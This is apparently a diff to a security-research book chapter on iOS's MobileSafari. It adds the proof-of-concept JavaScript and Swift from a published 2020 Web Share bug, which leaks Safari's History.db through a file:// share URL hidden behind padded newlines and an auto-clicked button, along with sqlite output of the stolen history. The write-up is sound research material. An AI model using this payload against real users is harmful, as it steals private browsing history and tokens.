@@ -846,9 +846,51 @@ MobileSafari:99988:0x1530f
 <p>we see it opens the file (with a predictable path)
 <div class="highlight"><pre><span></span><code>/private/var/mobile/Library/Safari/History.db
 </code></pre></div></p>
-<p>In an exploit documented at <a href="../Bibliography/#MSSV">https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html</a> by Pawel Wylecial, it was demonstrated that when performing a Share the Share URL is not constrained to the web page resources.  Private resources via the <code>file://</code> schema are supported but this means a malicious share URL can leak sensitive information.</p>
+<p>In an exploit documented at <a href="../Bibliography/#MSSV">https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html</a> by Pawel Wylecial, it was demonstrated that when performing a Share the Share URL is not constrained to the web page resources.  Private resources via the <code>file://</code> schema are supported so this means a malicious share URL can leak sensitive information.</p>
+<p>The malicious Javascript code is:
+<div class="highlight"><pre><span></span><code>&lt;script&gt;
+var opts = {
+text: &#39;check out this cute kitten! http://somerandomimagewebsite.com/cat.jpg\n
+\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&#39;,
+url: &#39;file:///private/var/mobile/Library/Safari/History.db&#39;};
+
+function run() {
+ navigator.share(opts);
+}
+&lt;/script&gt;
+</code></pre></div></p>
+<p>A button action runs this code:
+<div class="highlight"><pre><span></span><code>&lt;button id=&quot;share-btn-id&quot; class=&quot;button button1&quot; onclick=&#39;run();&#39;&gt;
+Share this photo&lt;/button&gt;
+</code></pre></div></p>
+<p>The containing app even clicks on this button on behalf of the user so they are only left with picking the share target:
+<div class="highlight"><pre><span></span><code>extension ViewController: WKNavigationDelegate {
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        if !autoPressedButton {
+            webViewOutlet.evaluateJavaScript(
+            &quot;document.getElementById(&#39;share-btn-id&#39;).click()&quot;) { (_, error) in
+                if error == nil {
+                    self.autoPressedButton = true
+                }
+            }
+        }
+    }
+}
+</code></pre></div></p>
 <p>To demonstrate the vulnerability with a free standing app, see <code>examples/history</code> from the <a href="../Bibliography/#TRTZ">The Road to Zero GitHub</a> website.  This app merely loads a malicious web page, which has a link to file:///private/var/mobile/Library/Safari/History.db, and upon loading, will also automatically click the share button, so all the user has to do is to pick the sharing target, such as Messages.</p>
-<p>Once shared, the recipient and view the website browsing history of the victim using a simple SQL Lite command.  We see output similar to the below:</p>
+<table>
+<thead>
+<tr>
+<th align="center"><img alt="Mobile Safari Share Vulnerability" src="../mobile-safari-share-vulnerability.jpg" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center"><strong>Mobile Safari Share Vulnerability</strong></td>
+</tr>
+</tbody>
+</table>
+<p>Once shared, the recipient can view the website browsing history of the victim using a simple SQL Lite command having first saved the <code>History.db</code> file locally on a Mac.  We see output similar to the below:</p>
 <div class="highlight"><pre><span></span><code># sqlite3 ~/Downloads/History.db
 SQLite version 3.36.0 2021-06-18 18:58:49
 Enter &quot;.help&quot; for usage hints.
@@ -862,6 +904,7 @@ INSERT INTO history_items VALUES(1209,&#39;http://www.cydiaimpactor.com/&#39;,&#
 .
 .
 </code></pre></div>
+<p>Clearly this demonstrates that the victim had visited the iPhone Wiki and Cydia Impactor websites, and also had used Microsoft One Drive.  Critical tokens were also leaked but have been censored from the above verbose dump.</p>
 <h2 id="documenting-the-journey">Documenting the Journey</h2>
 <p>We have just scratched the surface of <code>MobileSafari</code>.  In a way we have half-cheated.  We did not find a zero day from our own efforts but we did find interesting information.  When correlated to an actual exploit we can see what we have done would have taken us a step closer to the exploit.
 The item we found was that the <code>MobileSafari</code> had opened a sensitive file path which we discovered.  A separate vulnerability is that it allowed sharing of items with the <code>file://</code> URL schema; it is not something we figured out.  But if we had, then we would have had a reasonable stab at a hack because we would know what URL path to supply to the <code>file://</code> URL.</p>
